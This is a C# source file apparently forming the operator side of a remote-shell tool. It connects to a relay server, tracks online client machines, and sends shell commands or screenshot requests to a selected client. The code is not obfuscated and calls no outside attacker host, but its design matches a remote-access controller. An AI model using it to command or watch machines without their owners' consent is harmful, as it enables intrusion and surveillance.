using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ReShCaller
{
    public static class ReShCaller
    {
        private static RSCallerClient _client = new RSCallerClient("127.0.0.1", 65432);
        public static ConcurrentDictionary<Guid, ClientInfo> Clients { get; set; } = new ConcurrentDictionary<Guid, ClientInfo>();
        public static Guid SelectedClientId { get; set; }
        public static bool IsConnected { get; set; }
        public static event Action OnDisconnnected;
        public static event Action OnClientListReceived;
        public static event Action<ClientInfo> OnClientOnline;
        public static event Action<Guid> OnClientOffline;
        public static event Action<CommandResult> OnCommandResultReceived;
        public static void Initialize()
        {
            _client.OnMessageReceived += MessageReceive;
            _client.OnResultReceived += CommandResultReceived;
            _client.OnDisconnected += Disconnnected;
        }

        public static async Task<bool> ConnectAsync()
        {
            return (IsConnected = await _client.ConnectAsync());
        }
        public static void Disconnect()
        {
            _client.Disconnect();
        }
        public static void Disconnnected()
        {
            IsConnected = false;
            Clients.Clear();
            SelectedClientId = Guid.Empty;
            OnDisconnnected?.Invoke();
        }
        public static void CommandResultReceived(CommandResult result)
        {
            OnCommandResultReceived?.Invoke(result);
        }
        public static void MessageReceive(RSMessage message)
        {
            switch (message.Type)
            {
                case RSMessageType.CallerLoginResult:
                    {
                        CallerLoginResult clientList;
                        if (!message.TryGetData(out clientList))
                            goto default;
                        foreach(var client in clientList.OnlineClients)
                        {
                            Clients.TryAdd(client.ClientId, client);
                        }
                        OnClientListReceived?.Invoke();
                        break;
                    }
                case RSMessageType.ClientOnline:
                    {
                        ClientOnline clientOnline;
                        if (!message.TryGetData(out clientOnline))
                            goto default;
                        Clients.TryAdd(clientOnline.Info.ClientId, clientOnline.Info);
                        OnClientOnline?.Invoke(clientOnline.Info);
                        break;
                    }
                case RSMessageType.ClientOffline:
                    {
                        ClientOffline clientOffline;
                        if (!message.TryGetData(out clientOffline))
                            goto default;
                        Clients.TryRemove(clientOffline.ClientId, out _);
                        if (SelectedClientId == clientOffline.ClientId)
                        {
                            SelectedClientId = Guid.Empty;
                        }
                        OnClientOffline?.Invoke(clientOffline.ClientId);
                        break;
                    }
                default:
                    break;
            }
        }
        public static async void SendShellCommand(string shellCommand)
        {
            if (SelectedClientId == Guid.Empty)
            {
                return;
            }
            await _client.SendCommand(SelectedClientId, CommandType.ShellCommand, new Shell { Command = shellCommand });
        }

        public static async void TakeScreenshot()
        {
            if (SelectedClientId == Guid.Empty)
            {
                return;
            }
            await _client.SendCommand(SelectedClientId, CommandType.Screenshot, new Screenshot());
        }

    }
}
